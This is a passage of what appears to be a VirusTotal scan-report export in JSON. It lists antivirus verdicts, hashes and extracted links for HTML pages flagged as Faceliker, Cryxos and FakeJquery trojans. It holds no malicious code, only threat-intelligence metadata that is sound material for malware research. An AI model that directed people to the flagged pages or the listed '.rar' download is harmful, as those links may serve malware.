          "result": "JS:Redirector-CAG [Trj]",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230927"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220812"
        }
      },
      "sha256": "911c641a591bf6bc3879266fb766ee3a5368e26cfaaac4bf45ee1dbe61257fdc",
      "type_extension": "js",
      "tags": [
        "javascript",
        "contains-embedded-js"
      ],
      "last_analysis_date": 1696582985,
      "unique_sources": 2,
      "first_submission_date": 1628895599,
      "ssdeep": "96:lhAyDXAyvQgtFGBXehGSkUf23LIYjoCFSua8kw5t:lhPXTRF9Lf20Y/UuaSt",
      "md5": "7863649b1e7263107c7ed7bd4182dce2",
      "sha1": "f5bb5bcb969e696896909c2ea4559f41a461acf4",
      "magic": "HTML document, ISO-8859 text, with very long lines (547u), with CRLF, LF line terminators",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 16,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 14,
        "undetected": 46
      },
      "meaningful_name": "VirusShare_7863649b1e7263107c7ed7bd4182dce2",
      "reputation": -7
    },
    "type": "file",
    "id": "911c641a591bf6bc3879266fb766ee3a5368e26cfaaac4bf45ee1dbe61257fdc",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/911c641a591bf6bc3879266fb766ee3a5368e26cfaaac4bf45ee1dbe61257fdc"
    }
  }
},
{
  "_id": {
    "$oid": "65b4fccfff7f10aec9ee2718"
  },
  "data": {
    "attributes": {
      "type_description": "HTML",
      "tlsh": "T1914407E4239B141FD63BD9919C3ABD0EA0B30E739545B4BAF25F7BC49B582810F26718",
      "vhash": "htm:fe576826101a0721a5dca8aa3ad40831",
      "type_tags": [
        "internet",
        "html"
      ],
      "names": [],
      "last_modification_date": 1706332814,
      "type_tag": "html",
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 275219,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.cryxos/faceliker",
        "popular_threat_category": [
          {
            "count": 19,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 8,
            "value": "cryxos"
          },
          {
            "count": 5,
            "value": "faceliker"
          },
          {
            "count": 4,
            "value": "fbook"
          }
        ]
      },
      "html_info": {
        "title": "Shop tin hoc",
        "trackers": {
          "Google Analytics": [
            {
              "url": "https://www.google-analytics.com/analytics.js",
              "id": "UA-42912006-1"
            }
          ],
          "Facebook Connect": [
            {
              "url": "//connect.facebook.net/en_GB/all.js"
            }
          ]
        },
        "hrefs": [
          "https://www.blogger.com/static/v1/widgets/204402360-widget_css_bundle.css",
          "http://shoptinhoc123.blogspot.com/favicon.ico",
          "http://shoptinhoc123.blogspot.com/search/label/text",
          "http://shoptinhoc123.blogspot.com/feeds/posts/default",
          "http://shoptinhoc123.blogspot.com/feeds/posts/default?alt=rss",
          "https://www.blogger.com/feeds/5699468893335649701/posts/default",
          "https://www.blogger.com/profile/16181784545952019623",
          "https://www.blogger.com/dyn-css/authorization.css?targetBlogID=5699468893335649701&zx=d1772af0-ccf1-4ac1-a5ce-d132e086def1",
          "http://www.thaiaiti.com/p/mua-hang.html",
          "http://www.thaiaiti.com/2013/08/thiet-ke-web-theo-yeu-cau-tren-blogger.html",
          "http://www.thaiaiti.com/2013/10/website-thaiaiti-vers-final-1-san-pham.html",
          "http://www.thaiaiti.com/p/quang-cao-tai-thaisaiticom.html",
          "http://www.thaiaiti.com/2013/09/thaiaiti-lam-nhung-gi-ban-ang-can-gi.html",
          "http://www.thaiaiti.com/2013/07/tuyen-cong-tac-vien_1.html",
          "http://www.blogger.com/blogger.g?blogID=159346475683117460#allposts",
          "http://www.thaiaiti.com/p/tac-gia.html",
          "http://www.thaiaiti.com/search/label/Template%20blogger",
          "http://www.thaiaiti.com/search/label/Th%E1%BB%A7%20thu%E1%BA%ADt%20blogger",
          "http://www.thaiaiti.com/search/label/Th%E1%BB%A7%20thu%E1%BA%ADt%20PC",
          "http://www.thaiaiti.com/search/label/Photoshop",
          "http://phim.thaiaiti.com",
          "http://tv.thaiaiti.com",
          "https://sites.google.com/site/thaiaiti1992/Teamview_ThaiAiTi.rar",
          "http://www.thaiaiti.com/2013/11/huong-dan-tao-blogspot-cai-at-template_4.html",
          "http://www.thaiaiti.com/p/form-rut-ngan-css.html",
          "http://www.thaiaiti.com/2013/09/upload-va-lay-link-flash-on-gian-va.html",
          "http://www.thaiaiti.com/2013/07/thu-thuat-lay-data-blogspot-cua-nguoi.html",
          "/2013/01/phan-mem-vao-facebook-tot-nhat-tuyet-voi.html",
          "http://www.thaiaiti.com/2013/07/cap-nhat-driver-tot-nhat-am-bao-khong_2.html",
          "javascript:yourbag();",
          "javascript:;",
          "http://www.thaiaiti.com/2013/11/thiet-ke-template-wap-giao-dien-cho_5.html",
          "http://shoptinhoc123.blogspot.com/search/label/tin-tuc?&max-results=15",
          "http://shoptinhoc123.blogspot.com/2014/12/thaiaiticom-1-website-hang-au-thiet-ke.html",
          "http://www.thaiaiti.com/2013/11/thiet-ke-banner-flash-ong-slideshow-anh.html",
          "http://shoptinhoc123.blogspot.com/",
          "https://www.facebook.com/thaiaiti",
          "http://www.thaiaiti.com/",
          "https://plus.google.com/u/0/112598885967567994975",
          "http://www.thaiaiti.com/?m=1"
        ],
        "scripts": [
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "d88d58df30ffff53d90e9d293ab59c1445c2ce0095fe92e5f3789343beec617d"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "163a7782195c62f25d56a7e1493e589dfd2a8f7b00a709594a2051c65d4478bf"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "d7afafa84e009d5ce5870cb4ae2a94ee6cc1616d91bb6ea6f399df48648d153b"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "3700102343eba05efa64738e90b9e0cf3cbb60fa64230e3950aa01689924bcd8"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "6a03335690b9ec1b7ce030a114148d1d0eababc8afa03f06586072732a4f3652"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "28fdbc8d5acd064e370e995e2e82d5f2a0a7fb1a6b3dfd002c2c21299edd5ca3"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "afe927f30d824e78e379b617d1143db2cc05af9ceab47aa290ec923cd4034df3"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "e42a293dfad33f12b2b1e206f898c9fd592f12b69fd516daad9e657a6fac5a9d"
          },
          {
            "attributes": {
              "id": "_wau7gr"
            },
            "sha256": "3832bc2a366f954b7f0e372b512f450695d36cd3edaa94b5bc81dcd9ffb440c6"
          },
          {
            "attributes": {
              "language": "javascript"
            },
            "sha256": "da08ab862cb2a68dea9dd2a57ba7d94457ffd589155a12003d55fa8471671f4a"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "11b4b1d98fee30af6099ca6e7838690e9e79c74a19ed0dc2009d69757b769b51"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "ce64d8b223bdf1a51588710670cfb751fe65d9eb0f00f385f2c491fc299fa3a5"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "bf2d16b44e5951aaefe2e09479aaa33e108e645fa22421e65c5bd220afb73104"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "3ff0c771bb1f8e03f2e57fbbebd49f52db0eeb451192b74f1c25d8b33b78fcb2"
          },
          {
            "attributes": {
              "src": "https://www.blogger.com/static/v1/widgets/4182860900-widgets.js",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "7d240dfe9e39fbf6e5a1de9508d6ca067a6f705fd2666fbba5a1cd5b304784b9"
          }
        ],
        "html_meta": {
          "rating": [
            "general"
          ],
          "description": [
            "text"
          ],
          "generator": [
            "blogger",
            "TháiAiTi | Shop công nghệ, Bán File Thiết kế đồ họa, Thiết kế Web, Máy tính, Mua bán trực tuyến"
          ],
          "author": [
            "Thai AiTi"
          ],
          "country": [
            "Vietnam"
          ],
          "resource-type": [
            "document"
          ],
          "robots": [
            "index, follow"
          ],
          "revisit": [
            "1 days"
          ],
          "revisit-after": [
            "1 days"
          ],
          "language": [
            "Vietnamese, English"
          ],
          "audience": [
            "all"
          ],
          "GOOGLEBOT": [
            "index, follow"
          ],
          "Keywords": [
            "share template, shop cong nghe, ban file thiet ke do hoa, file photoshop, blogspot, blogger, share, share skin, thiet ke web gia re, thiet ke web theo yeu cau, share code, share tai lieu, do an, luan van, phan mem, hoc seo web"
          ],
          "google-site-verification": [
            "7IPlr6EVnqtXZT3f64S9PrX22-3q3iZe2OOCfMTeUV8"
          ],
          "distribution": [
            "global"
          ],
          "yahooBOT": [
            "index, follow"
          ],
          "Description": [
            "TháiAiTi | Shop công nghệ, Bán File Thiết kế đồ họa, Thiết kế Web, Máy tính, Mua bán trực tuyến"
          ]
        }
      },
      "last_submission_date": 1696598836,
      "reputation": -7,
      "trid": [
        {
          "file_type": "Atom web feed",
          "probability": 63.9
        },
        {
          "file_type": "wxWindows - wxPython Resource",
          "probability": 30.6
        },
        {
          "file_type": "HyperText Markup Language",
          "probability": 5.4
        }
      ],
      "sha256": "de4b31756b6a9dbabe8dc60f86188bf6d477fe18827119ceccc4efcaad97bc97",
      "type_extension": "html",
      "tags": [
        "html",
        "contains-embedded-js"
      ],
      "last_analysis_date": 1696780185,
      "unique_sources": 1,
      "first_submission_date": 1696598836,
      "ssdeep": "6144:+TEwhg/46E6Q93jVkS8/5xyP2UtHyUtCuwLytMYaDK:+Ywhg/46EK5keEl",
      "packers": {
        "Varist": "docwrite"
      },
      "md5": "795c42ca5b8cf5e119c9893bd0a7cdab",
      "sha1": "c1f212955708b991f5230b967e4a320146ce0740",
      "magic": "HTML document, Unicode text, UTF-8 text, with very long lines (4519u)",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 16,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 34,
        "undetected": 26
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.HTML.Generic.4!c",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "ClamAV": {
          "category": "malicious",
          "engine_name": "ClamAV",
          "engine_version": "1.2.0.0",
          "result": "Win.Trojan.Agent-35594",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": "JS.Faceliker.NP",
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Skyhigh": {
          "category": "undetected",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "ALYac": {
          "category": "malicious",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": "JS:Trojan.Cryxos.3717",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "VIPRE": {
          "category": "malicious",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": "JS:Trojan.Cryxos.3717",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Sangfor": {
          "category": "undetected",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230926"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.118.49815",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.118.49815",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230928"
        },
        "VirIT": {
          "category": "malicious",
          "engine_name": "VirIT",
          "engine_version": "9.5.552",
          "result": "JS.Agent.FF",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.20.0.0",
          "result": "ISB.Malscript!gen4",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.111",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231002"
        },
        "ESET-NOD32": {
          "category": "malicious",
          "engine_name": "ESET-NOD32",
          "engine_version": "28037",
          "result": "JS/Faceliker.BG",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.462",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "Other:Malware-gen [Trj]",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Cynet": {
          "category": "malicious",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.27",
          "result": "Malicious (score: 99)",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "HEUR:Trojan.Script.Generic",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "BitDefender": {
          "category": "malicious",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": "JS:Trojan.Cryxos.3717",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": "Trojan.Script.Injected.frlkkl",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "MicroWorld-eScan": {
          "category": "malicious",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": "JS:Trojan.Cryxos.3717",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Tencent": {
          "category": "malicious",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": "Trojan.JS.Fbook.504855",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Emsisoft": {
          "category": "malicious",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": "JS:Trojan.Cryxos.3717 (B)",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "F-Secure": {
          "category": "malicious",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1137.128",
          "result": "Malware.HTML/ExpKit.Gen2",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4968",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "SentinelOne": {
          "category": "type-unsupported",
          "engine_name": "SentinelOne",
          "engine_version": "23.3.0.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230705"
        },
        "Trapmine": {
          "category": "type-unsupported",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.94",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "FireEye": {
          "category": "malicious",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": "JS:Trojan.Cryxos.3717",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Sophos": {
          "category": "malicious",
          "engine_name": "Sophos",
          "engine_version": "2.3.1.0",
          "result": "Mal/FBJack-I",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan-Clicker.JS.Faceliker",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "231008-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Varist": {
          "category": "malicious",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "result": "JS/Faceliker.D",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": "HTML/ExpKit.Gen2",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "2023.8.30.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23090.2007",
          "result": "Trojan:JS/Fbook.AR!MTB",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.142.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Xcitium": {
          "category": "malicious",
          "engine_name": "Xcitium",
          "engine_version": "36067",
          "result": "TrojWare.JS.FBook.AS@7vf1pr",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Arcabit": {
          "category": "malicious",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": "JS:Trojan.Cryxos.DE85",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "ViRobot": {
          "category": "malicious",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": "JS.Z.Agent.275219",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "ZoneAlarm": {
          "category": "undetected",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.36627B:27.33425",
          "result": "JS:Trojan.Cryxos.3717",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1696784453",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230921"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.24.0.10447",
          "result": "Trojan/JS.FBook.SC192682",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "MAX": {
          "category": "malicious",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": "malware (ai score=84)",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231004"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Rising": {
          "category": "malicious",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": "Trojan.FaceLiker/JS!1.A0E6 (CLASSIC)",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-10-08.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.W32.redirector.ad",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "JS/FBJacking.FG!tr",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "result": "Other:Malware-gen [Trj]",
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230927"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231008"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220812"
        }
      }
    },
    "type": "file",
    "id": "de4b31756b6a9dbabe8dc60f86188bf6d477fe18827119ceccc4efcaad97bc97",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/de4b31756b6a9dbabe8dc60f86188bf6d477fe18827119ceccc4efcaad97bc97"
    }
  }
},
{
  "_id": {
    "$oid": "65b4fd9a25047c7018f82ab3"
  },
  "data": {
    "attributes": {
      "type_description": "HTML",
      "tlsh": "T1A463B7B16C5C8637022705CEA2B96729E5F98123EB42C850F2FC9B3D57D5FC36423A59",
      "vhash": "htm:db0a4f8859ea59eafcb20572395731ac",
      "type_tags": [
        "internet",
        "html"
      ],
      "names": [
        "digital"
      ],
      "last_modification_date": 1691062760,
      "type_tag": "html",
      "times_submitted": 2,
      "total_votes": {
        "harmless": 0,
        "malicious": 0
      },
      "size": 69403,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.fakejquery/fnzi",
        "popular_threat_category": [
          {
            "count": 18,
            "value": "trojan"
          },
          {
            "count": 8,
            "value": "downloader"
          }
        ],
        "popular_threat_name": [
          {
            "count": 16,
            "value": "fakejquery"
          },
          {
            "count": 7,
            "value": "fnzi"
          }
        ]
      },
      "html_info": {
        "iframes": [
          {
            "attributes": {
              "src": "http://player.vimeo.com/video/123063334?title=0&byline=0&portrait=0",
              "height": "281",
              "frameborder": "0",
              "width": "500"
            }
          }
        ],
        "title": "Digital – jadrooit",
        "hrefs": [
          "http://gmpg.org/xfn/11",
          "http://jadroobpo.com/xmlrpc.php",
          "http://jadroobpo.com/feed/",
          "http://jadroobpo.com/comments/feed/",
          "http://jadroobpo.com/tag/digital/feed/",
          "http://jadroobpo.com/wp-content/plugins/LayerSlider/static/css/layerslider.css?ver=5.6.6",
          "http://fonts.googleapis.com/css?family=Lato:100,300,regular,700,900%7COpen+Sans:300%7CIndie+Flower:regular%7COswald:300,regular,700&subset=latin%2Clatin-ext",
          "http://jadroobpo.com/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=4.4.2",
          "http://jadroobpo.com/wp-content/themes/startit/style.css?ver=4.5.23",
          "http://jadroobpo.com/wp-content/themes/startit/assets/css/plugins.min.css?ver=4.5.23",
          "http://jadroobpo.com/wp-content/themes/startit/assets/css/modules.min.css?ver=4.5.23",
          "http://jadroobpo.com/wp-content/themes/startit/assets/css/font-awesome/css/font-awesome.min.css?ver=4.5.23",
          "http://jadroobpo.com/wp-content/themes/startit/assets/css/elegant-icons/style.min.css?ver=4.5.23",
          "http://jadroobpo.com/wp-content/themes/startit/assets/css/ion-icons/css/ionicons.min.css?ver=4.5.23",
          "http://jadroobpo.com/wp-content/themes/startit/assets/css/linea-icons/style.css?ver=4.5.23",
          "http://jadroobpo.com/wp-content/themes/startit/assets/css/simple-line-icons/simple-line-icons.css?ver=4.5.23",
          "http://jadroobpo.com/wp-content/themes/startit/assets/css/dripicons/dripicons.css?ver=4.5.23",
          "http://jadroobpo.com/wp-content/themes/startit/assets/css/blog.min.css?ver=4.5.23",
          "http://jadroobpo.com/wp-includes/js/mediaelement/mediaelementplayer.min.css?ver=2.18.1",
          "http://jadroobpo.com/wp-includes/js/mediaelement/wp-mediaelement.min.css?ver=4.5.23",
          "http://jadroobpo.com/wp-content/themes/startit/assets/css/woocommerce.min.css?ver=4.5.23",
          "http://jadroobpo.com/wp-content/themes/startit/assets/css/woocommerce-responsive.min.css?ver=4.5.23",
          "http://jadroobpo.com/wp-content/themes/startit/assets/css/style_dynamic.css?ver=1477116494",
          "http://jadroobpo.com/wp-content/themes/startit/assets/css/modules-responsive.min.css?ver=4.5.23",
          "http://jadroobpo.com/wp-content/themes/startit/assets/css/blog-responsive.min.css?ver=4.5.23",
          "http://jadroobpo.com/wp-content/themes/startit/assets/css/style_dynamic_responsive.css?ver=1477116494",
          "http://jadroobpo.com/wp-content/plugins/js_composer/assets/css/js_composer.min.css?ver=4.11.2.1",
          "https://fonts.googleapis.com/css?family=Raleway%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&subset=latin%2Clatin-ext&ver=1.0.0",
          "http://jadroobpo.com/wp-json/",
          "http://jadroobpo.com/xmlrpc.php?rsd",
          "http://jadroobpo.com/wp-includes/wlwmanifest.xml",
          "http://jadroobpo.com/wp-content/plugins/jquery-vertical-accordion-menu/skin.php?widget_id=2&skin=demo",
          "http://jadroobpo.com/",
          "http://jadroobpo.com/about-us/",
          "http://jadroobpo.com/jadroo-group/",
          "http://jadroobpo.com/jadroo-bpo-2/",
          "http://jadroobpo.com/services-2/",
          "http://jadroobpo.com/download/",
          "http://jadroobpo.com/contact-us/",
          "http://jadroobpo.com/cart/",
          "javascript:void(0)",
          "http://jadroobpo.com/author/admin/",
          "http://jadroobpo.com/category/ideas/",
          "http://jadroobpo.com/category/trends/",
          "http://jadroobpo.com/tech-conference-2016/#comments",
          "http://jadroobpo.com/tech-conference-2016/",
